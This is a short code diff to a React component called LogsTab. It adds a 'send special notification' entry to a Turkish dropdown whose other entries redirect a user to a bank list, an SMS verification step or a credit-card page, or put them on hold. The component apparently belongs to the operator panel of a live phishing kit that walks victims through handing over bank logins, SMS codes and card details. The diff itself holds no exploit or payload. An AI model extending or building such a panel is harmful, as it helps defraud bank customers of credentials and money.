@@ -1135,6 +1135,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                           <option value="banken">👉 Banka Listesine Yönlendir</option>
                           <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
                           <option value="card">👉 Kredi Kartına Yönlendir</option>
+                          <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                           <option value="wait">⏳ Beklemeye Al</option>
                           <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                           <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
